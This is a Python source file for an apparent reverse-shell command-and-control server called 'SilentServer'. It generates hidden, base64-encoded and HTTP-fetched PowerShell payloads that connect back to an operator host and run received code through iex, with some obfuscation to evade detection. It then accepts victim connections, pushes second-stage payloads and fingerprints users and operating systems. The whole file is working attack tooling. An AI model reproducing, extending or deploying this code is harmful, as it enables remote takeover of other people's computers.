import socket
import time
import threading
import random
import dataclasses
import base64
import core.Payloads
import core.TextAssets

@dataclasses.dataclass
class DataPoll:
        new_data      : bool
        break_set     : bool

@dataclasses.dataclass
class ClientStructure:
        client        : object
        client_id     : str
        client_addr   : str
        client_os     : str
        client_user   : str
        client_status : str
        client_usage  : str

class SilentServer:
        def __init__(self, callback_address: str, callback_port: int, dwell_time: int = 2) -> None:
                self.callback_address   = callback_address
                self.callback_port      = callback_port
                self.dwell_time         = dwell_time
                self.listener           = None
                self.server_thread      = None
                self.manager            = None
                self.drop_clients       = False
                self.clients            = []
                self.in_comm            = False

        def get_raw_payload(self) -> str:
                payload                 = "start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
                payload                += self.callback_address
                payload                += "',"
                payload                +=  str(self.callback_port)
                payload                += ");[io.streamreader]::new($t.getstream()).readline()|iex}"

                return payload

        def get_payload(self) -> str:
                payload                 = "start powershell -wi h -arg {$t=[net.sockets.tcpclient]::new('"
                payload                += self.callback_address
                payload                += "',"
                payload                +=  str(self.callback_port)
                payload                += ");[io.streamreader]::new($t.getstream()).readline()|iex}"
                payload                 = payload.encode("utf-16le")
                payload                 = base64.b64encode(payload)
                payload                 = payload.decode("ascii")
                payload                 = "powershell -e " + payload

                return payload

        def get_http_payload(self, http_port: str) -> str:
                payload                 = "start powershell -wi h -arg {$i='i'+'ex';&$i(irm http://"
                payload                += self.callback_address

                if http_port != 80:
                        payload        += ":"
                        payload        += str(http_port)

                payload                += ")}"

                return payload

        def initialize_server(self) -> bool:
                if self.listener:
                        return False

                self.listener           = socket.socket()
                self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.listener.bind(("0.0.0.0", self.callback_port))
                self.listener.listen(socket.SOMAXCONN)

                self.server_thread      = threading.Thread(
                        target          = self.begin_listen,
                        daemon          = True
                )
                self.server_thread.start()

                self.drop_clients       = False
                self.manager            = threading.Thread(
                        target          = self.client_manager,
                        daemon          = True
                )
                self.manager.start()

                return True

        def shutdown(self) -> None:
                self.listener.close()
                self.listener           = None
                self.server_thread      = None

                return True

        # A solution to client connection management is using an independant thread to check current
        # clients connection status.

        # Every second, the thread will check the connection of the currently held clients.
        # To mitigate redundancy, do not check clients' connects that are already lost.
        # If a client is sending data recv(1, socket.MSG_PEEK) will check the first byte
        # while not consuming it. If we have a blocking error, the connection is still
        # present. If we get any other error, a disconnect.

        def client_manager(self) -> None:
                while not self.drop_clients:
                        time.sleep(1)
                        self.track_clients()

                self.drop_clients       = False

        def track_clients(self) -> None:
                for index, client in enumerate(self.clients):
                        if self.drop_clients:
                                return

                        if client.client_status == "Lost" or client.client_usage == "Yes":
                                continue

                        if not self.peek_client(client.client):
                                client.client_status = "Lost"
                                self.clients[index] = client
                                self.print_lost_client(client)

        def peek_client(self, client) -> None:
                try:
                        data            = client.recv(1, socket.MSG_PEEK)
                except ConnectionResetError:
                        return False
                except BlockingIOError:
                        return True
                except OSError:
                        return False

                return data == b""

        def print_lost_client(self, client: socket.socket) -> None:
                if self.in_comm:
                        core.TextAssets.print_lost_client(client, False)

                if not self.in_comm:
                        core.TextAssets.print_lost_client(client, True)

        def kill_clients(self) -> None:
                self.drop_clients       = True
                active_clients          = 0

                for client in self.clients:
                        if client.client_status == "Active":
                                active_clients += 1

                for client in self.clients:
                        client.client.close()

                self.clients            = []
                core.TextAssets.print_killed(active_clients)

        # Previously, we were able to accept as many clients possible, but we were not able to handle
        # all of them simultaneously. Because we have a strict time format for handling an accepted
        # client, this means we may be very slow to react to many connections (waiting up to the
        # entire timeout duration of each connected client).

        # Instead of letting our own timer bog the work, we instead run independent threads to handle
        # a newly accepted client.

        def begin_listen(self) -> None:
                while True:
                        try:
                                client, address = self.listener.accept()
                        except OSError:
                                return
                        except Exception as exception:
                                print(exception)
                                return

                        client.setblocking(False)

                        client_check    = threading.Thread(
                                target  = self.begin_accept,
                                args    = (client, address),
                                daemon  = True
                        )
                        client_check.start()

        def begin_accept(self, client: socket.socket, address: str) -> None:
                client_object           = self.verify_client(client)

                if not client_object:
                        client.close()
                        return

                client_id, username, os = client_object

                client_struct   = ClientStructure(
                        client        = client,
                        client_id     = client_id,
                        client_addr   = address[0],
                        client_os     = os,
                        client_user   = username,
                        client_status = "Active",
                        client_usage  = "No"
                )

                self.clients.append(client_struct)
                core.TextAssets.print_client(client_struct)

        def verify_client(self, client: socket.socket) -> tuple[str, str, str]:
                client_id               = self.get_client_id()

                INITIAL_WAIT            = self.wait_client(client)

                if INITIAL_WAIT == None:
                        return None

                if INITIAL_WAIT == b"":
                        if not self.send_payload(client, client_id):
                                return None

                user_object             = self.verify_username(client)

                if not user_object:
                        return None

                if len(user_object) == 1:
                        username        = user_object[0]
                else:
                        return client_id, user_object[0], user_object[1]

                os                      = self.verify_os(client)

                if not os:
                        return None

                return client_id, username, os

        def get_client_id(self) -> str:
                client_id               = []

                for _ in range(3):
                        bits            = random.getrandbits(16)
                        bits_string     = "{:04x}".format(bits)
                        client_id.append(bits_string)

                client_id               = "-".join(client_id).upper()

                return client_id

        def send_payload(self, client: socket.socket, client_id: str) -> bool:
                client.send(f"$w=[io.streamwriter]::new($t.getstream());$w.write('{client_id}');$w.flush();[io.streamreader]::new($t.getstream()).readline()|iex\n".encode())
                data                    = self.wait_client(client).decode()

                if not data:
                        return False

                if data != client_id:
                        return False

                client.send(core.Payloads.NETWORK_PAYLOAD.encode())

                return self.wait_client(client)

        def verify_username(self, client: socket.socket) -> tuple[str, str]:
                client.send("whoami\n".encode())
                data                    = self.wait_client(client).decode()

                if not data:
                        return None

                if "\n" in data:
                        data            = data.split("\n")

                if data[0] == "whoami":
                        data            = data[1:]

                if not isinstance(data, list):
                        data            = [data]

                for potential_data in data:
                        if potential_data.strip("\r"):
                                data    = potential_data.strip("\r")
                                break

                if "\\" in data:
                        user            = data.split("\\")[1]
                        os              = "Windows"

                        return user, os
                else:
                        return data, None

        def verify_os(self, client: socket.socket) -> str:
                client.send("uname\n".encode())
                data                    = self.wait_client(client).decode()

                if not data:
                        return None

                if "\n" in data:
                        data            = data.split("\n")

                if data[0] == "uname":
                        data            = data[1:]

                if not isinstance(data, list):
                        data            = [data]

                for potential_data in data:
                        if potential_data.strip("\r"):
                                data    = potential_data.strip("\r")
                                break

                return data

        #def wait_client(self) -> bool:
        #        data                    = b""
        #        previous_data_length    = len(data)
        #
        #        for wait_iteration in range(10):
        #                try:
        #                        data   += self.client.recv(1024)
        #                        
        #                        if len(data) == previous_data_length:
        #                                time.sleep(1)
        #                                data += self.should_quit()
        #
        #                                if len(data) == previous_data_length:
        #                                        return data
        #                                else:
        #                                        previous_data_length = len(data)
        #
        #                except BlockingIOError:
        #                        time.sleep(0.5)
        #
        #        return data
        #
        #def should_quit(self) -> bytes:
        #    try:
        #            data                = self.client.recv(1024)
        #            return data
        #    except BlockingIOError:
        #            return b""

        # Previously, we were expecting the client to not send data in many chunks. As for reverse
        # shells, this is a critical failure. Reverse shells will often send the first available 
        # standard output of a process. This means the data will ALWAYS result in chunks.

        # Instead of accepting the first data we receive, give a duration of time for the last sent
        # data before accepting the final output.

        def wait_client(self, client: socket.socket) -> bytes:
                data                    = b""

                data_poll               = DataPoll(
                        new_data        = True,
                        break_set       = False
                )

                data_poller             = threading.Thread(
                        target          = self.data_poller,
                        args            = (data_poll,),
                        daemon          = True
                )
                data_poller.start()

                while not data_poll.break_set:
                        try:
                                data   += client.recv(1024)
                                data_poll.new_data = True
                        except BlockingIOError:
                                pass
                        except ConnectionResetError:
                                return b""

                return data

        def data_poller(self, data_poll: DataPoll) -> None:
                times_data_checked      = 0

                while times_data_checked != (self.dwell_time * 10):
                        if data_poll.new_data:
                                times_data_checked = 0
                                data_poll.new_data = False
                                continue

                        times_data_checked += 1
                        time.sleep(0.1)

                data_poll.break_set     = True